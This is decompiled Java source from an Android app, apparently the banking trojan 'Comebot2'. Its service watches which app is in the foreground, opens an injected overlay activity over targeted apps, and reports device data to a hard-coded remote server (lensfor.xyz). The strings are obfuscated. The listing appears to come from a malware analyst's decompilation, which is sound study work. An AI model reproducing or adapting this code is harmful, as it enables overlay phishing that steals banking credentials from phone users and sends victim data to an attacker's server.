package anu_bispro.app;

import android.app.ActivityManager;
import android.app.IntentService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class apiproc extends IntentService {
  d a = new d();
  
  a b = new a();
  
  Context c;
  
  b d = new b();
  
  public apiproc() {
    super(d.a("G\000O\000T\037E"));
  }
  
  void a() {
    if (Build.VERSION.SDK_INT <= 21) {
      int i = 0;
      String str = "";
      byte b1 = 0;
      int j = 0;
      while (j > -1) {
        if (!b1)
          str = this.b.a(this.c, b.a("UZP^yRHQ")); 
        if (b1 >= 19)
          b1 = -1; 
        if (str != null) {
          String[] arrayOfString = str.split(d.a("\t"));
          int k = 0;
          for (j = 0; k < arrayOfString.length; j = k) {
            String[] arrayOfString1 = arrayOfString[j].split(b.a("\027"));
            int m = 1;
            for (k = 1;; k = m) {
              if (m < arrayOfString1.length) {
                try {
                  if (b().contains(arrayOfString1[k]) && !this.b.a(this.c, d.a("\036G\035C")).contains(b.a("RIS^"))) {
                    Intent intent = new Intent();
                    this((Context)this, actinj.class);
                    intent = intent.putExtra(d.a("U\004T"), arrayOfString1[0]);
                    intent.addFlags(268435456);
                    intent.addFlags(8388608);
                    intent.addFlags(1073741824);
                    startActivity(intent);
                    try {
                      TimeUnit.SECONDS.sleep(2L);
                    } catch (InterruptedException interruptedException) {}
                  } 
                } catch (Exception exception) {
                  b b2 = this.d;
                  StringBuilder stringBuilder = new StringBuilder();
                  this.a.getClass();
                  b2.a(stringBuilder.insert(0, "https://lensfor.xyz").append(b.a("\tKTRPZR^\tZB_yWI\\\bKNK")).toString(), (new StringBuilder()).insert(0, d.a("\000\033")).append(this.b.b((new StringBuilder()).insert(0, this.b.a((Context)this)).append(b.a("ZХѮЃЗЁЖ\033БЋЙѸѧЁЖ\033ОІАЎМѹЖG")).toString())).toString());
                } 
              } else {
                break;
              } 
              m = k + 1;
            } 
            k = j + 1;
          } 
        } 
        try {
          Thread.sleep(1000L);
        } catch (InterruptedException interruptedException) {
          interruptedException.printStackTrace();
        } 
        j = i + 1;
        i = j;
        b1++;
      } 
    } else {
      int[] arrayOfInt = new int[5000];
      int i = 0;
      int j;
      for (j = 0; i < arrayOfInt.length; j = i) {
        i = j + 1;
        arrayOfInt[j] = 0;
      } 
      byte b1 = 0;
      String str = "";
      j = 0;
      for (i = 0; i > -1; i = b1) {
        if (j == 0)
          str = this.b.a(this.c, d.a("\003G\006C/O\036L")); 
        if (j >= 8)
          j = -1; 
        i = j;
        if (str != null) {
          i = 0;
          try {
            while (i < (c()).length) {
              String str1 = b.a("O");
              StringBuilder stringBuilder1 = new StringBuilder();
              this();
              StringBuilder stringBuilder2 = stringBuilder1.insert(0, "");
              String str2 = c()[i];
              i++;
              Log.e(str1, stringBuilder2.append(str2).toString());
            } 
          } catch (Exception exception) {
            Log.e(d.a("\025T"), b.a("CI"));
          } 
          try {
            Thread.sleep(1000L);
          } catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
          } 
          i = j + 1;
        } 
        b1++;
        j = i;
      } 
    } 
  }
  
  public String b() {
    if (Build.VERSION.SDK_INT <= 19) {
      List list = ((ActivityManager)getSystemService(d.a("\021E\004O\006O\004_"))).getRunningTasks(1);
      ComponentName componentName = ((ActivityManager.RunningTaskInfo)list.get(0)).topActivity;
      return ((ActivityManager.RunningTaskInfo)list.get(0)).topActivity.getPackageName();
    } 
    return ((ActivityManager.RunningAppProcessInfo)((ActivityManager)getSystemService(b.a("GXRRPRRB"))).getRunningAppProcesses().get(0)).processName;
  }
  
  protected void onHandleIntent(Intent paramIntent) {
    this.c = (Context)this;
    this.b.a(this.c, b.a("HZK^"), d.a("@\021J\003C"));
    a();
  }
}


/* Location:              /home/fahim/Desktop/Comebot2-dex2jar.jar!/anu_bispro/app/apiproc.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */